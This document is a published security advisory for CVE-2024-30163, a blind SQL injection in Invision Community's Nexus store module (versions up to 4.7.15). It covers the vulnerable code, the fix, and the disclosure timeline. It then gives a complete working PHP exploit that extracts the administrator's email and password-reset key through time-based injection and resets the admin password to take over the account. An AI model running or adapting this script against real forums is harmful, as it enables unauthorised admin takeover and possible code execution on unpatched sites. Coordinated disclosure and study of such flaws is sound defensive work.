--------------------------------------------------------------------
Invision Community <= 4.7.15 (store.php) SQL Injection Vulnerability
--------------------------------------------------------------------


[-] Software Link:

https://invisioncommunity.com


[-] Affected Versions:

All versions from 4.4.0 to 4.7.15.


[-] Vulnerability Description:

The vulnerability is located in the
/applications/nexus/modules/front/store/store.php script.
Specifically, into the
IPS\nexus\modules\front\store\_store::_categoryView() method:

126 /* Apply Filters */
127 if ( isset( \IPS\Request::i()->filter ) and \is_array(
\IPS\Request::i()->filter ) )
128 {
129 $url = $url->setQueryString( 'filter', \IPS\Request::i()->filter );
130 foreach ( \IPS\Request::i()->filter as $filterId => $allowedValues )
131 {
132 $where[] = array( \IPS\Db::i()->findInSet(
"filter{$filterId}.pfm_values", array_map( 'intval', explode( ',',
$allowedValues ) ) ) );
133 $joins[] = array( 'table' => array( 'nexus_package_filters_map',
"filter{$filterId}" ), 'on' => array(
"filter{$filterId}.pfm_package=p_id AND
filter{$filterId}.pfm_filter=?", $filterId ) );
134 }
135 }

User input passed through the "filter" request parameter is not
properly sanitized before being
assigned to the $where and $joins variables (lines 132 and 133), which
are later used to execute
some SQL queries. This can be exploited by unauthenticated attackers
to carry out time-based or
error-based Blind SQL Injection attacks. Subsequently, this might also
be exploited to reset
users' passwords and gain unauthorized access to the AdminCP, in order
to achieve
Remote Code Execution (RCE). Successful exploitation of this
vulnerability requires
the nexus application to be installed and configured with one "Product
Group" at least.


[-] Proof of Concept:

https://karmainsecurity.com/pocs/CVE-2024-30163.php


[-] Solution:

Upgrade to version 4.7.16 or later.


[-] Disclosure Timeline:

[08/01/2024] - Vulnerability details sent to SSD Secure Disclosure
[12/03/2024] - Version 4.7.16 released
[20/03/2024] - CVE identifier requested
[24/03/2024] - CVE identifier assigned
[05/04/2024] - Coordinated public disclosure


[-] CVE Reference:

The Common Vulnerabilities and Exposures project (cve.mitre.org)
has assigned the name CVE-2024-30163 to this vulnerability.


[-] Credits:

Vulnerability discovered by Egidio Romano.


[-] Other References:

https://invisioncommunity.com/release-notes/4716-r128/
https://ssd-disclosure.com/ssd-advisory-ip-board-nexus-rce-and-blind-sqli/


[-] Original Advisory:

http://karmainsecurity.com/KIS-2024-02


-----------------------
PoC:

<?php

/*
    --------------------------------------------------------------------
    Invision Community <= 4.7.15 (store.php) SQL Injection Vulnerability
    --------------------------------------------------------------------

    author..............: Egidio Romano aka EgiX
    mail................: n0b0d13s[at]gmail[dot]com
    software link.......: https://invisioncommunity.com

    +-------------------------------------------------------------------------+
    | This proof of concept code was written for educational purpose only.    |
    | Use it at your own risk. Author will be not responsible for any damage. |
    +-------------------------------------------------------------------------+

    [-] Vulnerability Description:

    The vulnerability is located in the /applications/nexus/modules/front/store/store.php script.
    Specifically, into the IPS\nexus\modules\front\store\_store::_categoryView() method: user
    input passed through the "filter" request parameter is not properly sanitized before being
    assigned to the $where and $joins variables, which are later used to execute some SQL
    queries. This can be exploited by unauthenticated attackers to carry out time-based
    or error-based SQL Injection attacks.

    [-] Original Advisory:

    https://karmainsecurity.com/KIS-2024-02
*/

set_time_limit(0);
error_reporting(E_ERROR);

if (!extension_loaded("curl")) die("[-] cURL extension required!\n");

if ($argc != 2) die("\nUsage: php $argv[0] <URL>\n\n");

$url = $argv[1];
$ch  = curl_init();
$sec = 3; // number of seconds for SLEEP(): less seconds, less accurate

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_URL, "{$url}index.php?/store/");

function sql_injection($sql)
{
  global $ch, $sec;

  $min = true;
  $idx = 1;

  while(1)
  {
    $test = 256;

    for ($i = 7; $i >= 0; $i--)
    {
      $test = $min ? ($test - pow(2, $i)) : ($test + pow(2, $i));
      $injection = "` ON 1 UNION SELECT IF(ORD(SUBSTR(({$sql}),{$idx},1))<{$test},1,SLEEP({$sec})) OR ?=?#";
      curl_setopt($ch, CURLOPT_POSTFIELDS, sprintf("cat=1&filter[%s]=1", rawurlencode($injection)));
      $start = time(); curl_exec($ch); $secs = time() - $start;
      $min = ($secs < $sec);
    }

    if (($chr = $min ? ($test - 1) : ($test)) == 0) break;
    $data .= chr($chr); $min = true; $idx++;
    print "\r[*] Data: {$data}";
  }

  return $data;
}

print "[+] Step 1: fetching admin's e-mail address\n";

$email = sql_injection("SELECT email FROM core_members WHERE member_id=1");

print "\n[+] Step 2: go to {$url}index.php?/lostpassword/ and request a password reset by using the above e-mail. When you're done press enter.";

fgets(STDIN);

print "[+] Step 3: fetching the password reset key\n";

$vid = sql_injection("SELECT vid FROM core_validating WHERE member_id=1 AND lost_pass=1 ORDER BY entry_date DESC LIMIT 1");

print "\n[+] Step 4: taking over the admin account by resetting their password\n";

@unlink('./cookies.txt');

curl_setopt($ch, CURLOPT_URL, "{$url}index.php?/lostpassword/");
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, './cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, './cookies.txt');

if (!preg_match('/csrfKey: "([^"]+)"/i', curl_exec($ch), $csrf)) die("[-] CSRF token not found!\n");

$passwd = md5(time());
$params = "do=validate&vid={$vid}&mid=1&password={$passwd}&password_confirm={$passwd}&resetpass_submitted=1&csrfKey={$csrf[1]}";

curl_setopt($ch, CURLOPT_POSTFIELDS, $params);

if (!preg_match("/301 Moved Permanently/i", curl_exec($ch))) die("[-] Attack failed!\n");

print "[+] Done! You can log into the AdminCP with {$email}:{$passwd}\n";
